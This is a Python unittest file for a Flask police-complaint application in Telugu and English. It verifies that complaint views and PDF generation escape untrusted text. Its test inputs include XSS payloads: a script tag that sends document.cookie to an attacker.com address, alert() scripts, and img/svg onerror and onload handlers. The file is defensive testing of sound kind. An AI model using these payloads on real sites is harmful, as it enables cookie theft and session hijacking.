"""
Tests for SEC-04: Cross-Site Scripting (XSS) Prevention and Safe Content Rendering.
Verifies Jinja2 autoescaping for untrusted complaint text, transcripts, and LLM output,
removal of unsafe |safe filters, preservation of Telugu/English formatting via CSS white-space: pre-wrap,
and secure PDF generation without code execution sinks.
Uses isolated temporary SQLite database and synthetic test payloads.
"""

import os
import shutil
import tempfile
import unittest
from unittest.mock import patch

from config import Config
from backend import create_app
from backend.services.database import init_db, create_officer, save_complaint
from backend.services.auth import generate_password_hash
from backend.services.pdf_generator import (
    render_telugu_complaint_html,
    render_english_complaint_html,
    generate_telugu_pdf,
    generate_english_pdf
)


class TestXSSSecurity(unittest.TestCase):

    def setUp(self):
        """Set up an isolated temporary database, test client, and test users."""
        self.temp_db = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        self.temp_db_path = self.temp_db.name
        self.temp_db.close()

        init_db(self.temp_db_path)

        self.db_patcher = patch.object(Config, "DATABASE_PATH", self.temp_db_path)
        self.db_patcher.start()

        self.app = create_app()
        self.app.config["TESTING"] = True
        self.app.config["DATABASE_PATH"] = self.temp_db_path

        # Provision test accounts
        self.admin_id = create_officer(
            username="xss_admin",
            password_hash=generate_password_hash("XssAdminPass123!"),
            full_name="XSS Admin Officer",
            role="admin",
            db_path=self.temp_db_path
        )

        self.officer_id = create_officer(
            username="xss_officer",
            password_hash=generate_password_hash("XssOfficerPass123!"),
            full_name="XSS Test Officer",
            role="officer",
            db_path=self.temp_db_path
        )

        self.viewer_id = create_officer(
            username="xss_viewer",
            password_hash=generate_password_hash("XssViewerPass123!"),
            full_name="XSS Viewer User",
            role="viewer",
            db_path=self.temp_db_path
        )

        self.created_files = []
        self.created_dirs = []

    def tearDown(self):
        """Clean up isolated database, patchers, and created files."""
        self.db_patcher.stop()

        if os.path.exists(self.temp_db_path):
            try:
                os.remove(self.temp_db_path)
            except OSError:
                pass

        for f in self.created_files:
            if os.path.exists(f):
                try:
                    os.remove(f)
                except OSError:
                    pass

        for d in self.created_dirs:
            if os.path.exists(d):
                shutil.rmtree(d, ignore_errors=True)

        # Clean up any test directory in case_records/2026/November
        nov_dir = os.path.join("case_records", "2026", "November")
        if os.path.exists(nov_dir):
            shutil.rmtree(nov_dir, ignore_errors=True)

    def _login_client(self, username, role, officer_id):
        """Helper to create an authenticated Flask test client."""
        client = self.app.test_client()
        with client.session_transaction() as sess:
            sess["officer_id"] = officer_id
            sess["username"] = username
            sess["role"] = role
        return client

    def _seed_test_complaint(self, telugu_text, english_text, complainant="Test Complainant"):
        """Helper to seed a test complaint in the isolated database."""
        return save_complaint(
            registered_on="2026-11-02 12:00:00",
            english_name=complainant,
            telugu_name="పరీక్ష ఫిర్యాదుదారు",
            phone="9876543210",
            subject="XSS Security Verification",
            audio_path="audio/test_xss.webm",
            telugu_complaint=telugu_text,
            english_complaint=english_text,
            db_path=self.temp_db_path
        )

    def test_01_normal_english_complaint_renders_correctly(self):
        """1. Verify standard English complaint text renders correctly with all metadata."""
        english_text = (
            "I am reporting the loss of my black leather wallet near RTC bus complex.\n\n"
            "The wallet contained my Aadhaar card, driving license, and Rs. 2,500 cash.\n\n"
            "Kindly investigate and help recover my lost belongings."
        )
        cid = self._seed_test_complaint("తెలుగు టెక్స్ట్", english_text, "Rajesh Varma")

        client = self._login_client("xss_officer", "officer", self.officer_id)
        resp = client.get(f"/view_english/{cid}")

        self.assertEqual(resp.status_code, 200)
        html = resp.data.decode("utf-8")
        self.assertIn("Rajesh Varma", html)
        self.assertIn("black leather wallet", html)
        self.assertIn("Aadhaar card", html)
        self.assertIn("Case ID", html)

    def test_02_telugu_complaint_renders_correctly(self):
        """2. Verify standard Telugu complaint text renders correctly with Telugu font and layout."""
        telugu_text = (
            "నిన్న సాయంత్రం ఆర్టీసీ బస్టాండ్ వద్ద నా నల్లటి బ్యాగ్ పోయింది.\n\n"
            "అందులో నా ఒరిజినల్ సర్టిఫికెట్లు మరియు కొంత నగదు ఉన్నాయి.\n\n"
            "దయచేసి విచారించి నా బ్యాగ్ ను ఇప్పించవలసిందిగా కోరుచున్నాను."
        )
        cid = self._seed_test_complaint(telugu_text, "English text", "రమేష్ రావు")

        client = self._login_client("xss_officer", "officer", self.officer_id)
        resp = client.get(f"/view_telugu/{cid}")

        self.assertEqual(resp.status_code, 200)
        html = resp.data.decode("utf-8")
        self.assertIn("నిన్న సాయంత్రం ఆర్టీసీ బస్టాండ్ వద్ద", html)
        self.assertIn("సర్టిఫికెట్లు", html)
        self.assertIn("Case ID", html)

    def test_03_html_tags_display_as_escaped_text(self):
        """3. Verify HTML markup tags (e.g. <h1>, <b>, <i>, <div>) display as escaped text, not raw HTML."""
        payload_english = "<h1>Police Report</h1><p>Notice with <b>bold text</b> and <span class='alert'>styled tag</span></p>"
        payload_telugu = "<h2>ముఖ్య గమనిక</h2><div>వివరాలు <i>పరీక్ష</i></div>"
        cid = self._seed_test_complaint(payload_telugu, payload_english)

        client = self._login_client("xss_officer", "officer", self.officer_id)

        # Check English view
        resp_en = client.get(f"/view_english/{cid}")
        self.assertEqual(resp_en.status_code, 200)
        html_en = resp_en.data.decode("utf-8")
        self.assertNotIn("<h1>Police Report</h1>", html_en)
        self.assertIn("&lt;h1&gt;Police Report&lt;/h1&gt;", html_en)
        self.assertNotIn("<b>bold text</b>", html_en)
        self.assertIn("&lt;b&gt;bold text&lt;/b&gt;", html_en)

        # Check Telugu view
        resp_te = client.get(f"/view_telugu/{cid}")
        self.assertEqual(resp_te.status_code, 200)
        html_te = resp_te.data.decode("utf-8")
        self.assertNotIn("<h2>ముఖ్య గమనిక</h2>", html_te)
        self.assertIn("&lt;h2&gt;ముఖ్య గమనిక&lt;/h2&gt;", html_te)

    def test_04_script_tag_payloads_do_not_execute(self):
        """4. Verify <script> tag injection payloads are safely escaped and never rendered as executable tags."""
        malicious_script = (
            "Normal text preamble. "
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script> "
            "<script type='text/javascript'>alert('XSS_ATTACK');</script>"
        )
        cid = self._seed_test_complaint(malicious_script, malicious_script)

        client = self._login_client("xss_officer", "officer", self.officer_id)

        for endpoint in [f"/view_english/{cid}", f"/view_telugu/{cid}"]:
            resp = client.get(endpoint)
            self.assertEqual(resp.status_code, 200)
            html = resp.data.decode("utf-8")
            # Must NOT contain raw unescaped script tag
            self.assertNotIn("<script>", html)
            self.assertNotIn("<script type='text/javascript'>", html)
            # Must contain properly escaped HTML entities
            self.assertIn("&lt;script&gt;", html)

    def test_05_event_handler_payloads_do_not_execute(self):
        """5. Verify inline event handler payloads (onerror, onload, onmouseover) cannot inject executable attributes."""
        img_payload = '<img src="invalid_image.jpg" onerror="alert(\'XSS_IMG_ERROR\');">'
        svg_payload = '<svg onload="alert(\'XSS_SVG_LOAD\');">'
        body_payload = f"Incident details: {img_payload} and {svg_payload}"
        cid = self._seed_test_complaint(body_payload, body_payload)

        client = self._login_client("xss_officer", "officer", self.officer_id)

        for endpoint in [f"/view_english/{cid}", f"/view_telugu/{cid}"]:
            resp = client.get(endpoint)
            self.assertEqual(resp.status_code, 200)
            html = resp.data.decode("utf-8")
            # Raw tag injection must NOT appear
            self.assertNotIn('<img src="invalid_image.jpg"', html)
            self.assertNotIn('<svg onload=', html)
            # Escaped entities must appear
            self.assertIn('&lt;img src=&#34;invalid_image.jpg&#34;', html)
            self.assertIn('&lt;svg onload=&#34;', html)

    def test_06_line_breaks_and_paragraph_formatting_intact(self):
        """6. Verify multi-line and multi-paragraph formatting is preserved via CSS white-space: pre-wrap."""
        multiline_text = (
            "Section 1: Initial event description.\n\n"
            "Section 2: Detailed observations and suspects.\n\n"
            "Section 3: Requested police action."
        )
        cid = self._seed_test_complaint(multiline_text, multiline_text)

        client = self._login_client("xss_officer", "officer", self.officer_id)

        resp_en = client.get(f"/view_english/{cid}")
        html_en = resp_en.data.decode("utf-8")
        # Verify body element contains clean newlines without dangerous safe-filter <div> injection
        self.assertIn('<div class="body">Section 1: Initial event description.\n\nSection 2: Detailed observations', html_en)
        # Verify CSS white-space: pre-wrap is present in the rendered document styles
        self.assertIn("white-space: pre-wrap", html_en)

        resp_te = client.get(f"/view_telugu/{cid}")
        html_te = resp_te.data.decode("utf-8")
        self.assertIn('<div class="body">Section 1: Initial event description.\n\nSection 2: Detailed observations', html_te)
        self.assertIn("white-space: pre-wrap", html_te)

    def test_07_admin_officer_viewer_complaint_views_work(self):
        """7. Verify Admin, Officer, and Viewer roles can all view complaints with safe escaping."""
        cid = self._seed_test_complaint("తెలుగు వివరణ", "English description with <script>test</script>")

        for username, role, oid in [
            ("xss_admin", "admin", self.admin_id),
            ("xss_officer", "officer", self.officer_id),
            ("xss_viewer", "viewer", self.viewer_id)
        ]:
            client = self._login_client(username, role, oid)

            resp_en = client.get(f"/view_english/{cid}")
            self.assertEqual(resp_en.status_code, 200, f"Role {role} failed on /view_english")
            self.assertIn("&lt;script&gt;test&lt;/script&gt;", resp_en.data.decode("utf-8"))

            resp_te = client.get(f"/view_telugu/{cid}")
            self.assertEqual(resp_te.status_code, 200, f"Role {role} failed on /view_telugu")
            self.assertIn("తెలుగు వివరణ", resp_te.data.decode("utf-8"))

    def test_08_pdf_generation_with_xss_payloads_succeeds_safely(self):
        """8. Verify PDF generation processes complaint with XSS payloads without crashing or executing script."""
        payload_text = "Report with <script>alert('PDF_XSS')</script> and \n\nParagraph 2."
        cid = self._seed_test_complaint(payload_text, payload_text)

        # Verify rendered HTML for PDF generation is autoescaped
        rendered_telugu_html = render_telugu_complaint_html(cid, db_path=self.temp_db_path)
        self.assertNotIn("<script>alert('PDF_XSS')</script>", rendered_telugu_html)
        self.assertIn("&lt;script&gt;", rendered_telugu_html)

        rendered_english_html = render_english_complaint_html(cid, db_path=self.temp_db_path)
        self.assertNotIn("<script>alert('PDF_XSS')</script>", rendered_english_html)
        self.assertIn("&lt;script&gt;", rendered_english_html)

        # Generate actual PDFs to verify Playwright renders escaped HTML safely
        out_te = tempfile.NamedTemporaryFile(suffix=".pdf", delete=False).name
        out_en = tempfile.NamedTemporaryFile(suffix=".pdf", delete=False).name
        self.created_files.extend([out_te, out_en])

        try:
            generate_telugu_pdf(out_te, cid, db_path=self.temp_db_path)
            self.assertTrue(os.path.exists(out_te))
            self.assertGreater(os.path.getsize(out_te), 1000)
            with open(out_te, "rb") as f:
                header = f.read(5)
            self.assertEqual(header, b"%PDF-")

            generate_english_pdf(out_en, cid, db_path=self.temp_db_path)
            self.assertTrue(os.path.exists(out_en))
            self.assertGreater(os.path.getsize(out_en), 1000)
            with open(out_en, "rb") as f:
                header = f.read(5)
            self.assertEqual(header, b"%PDF-")
        except Exception as e:
            self.fail(f"PDF generation failed on XSS-safe template: {e}")


if __name__ == "__main__":
    unittest.main()
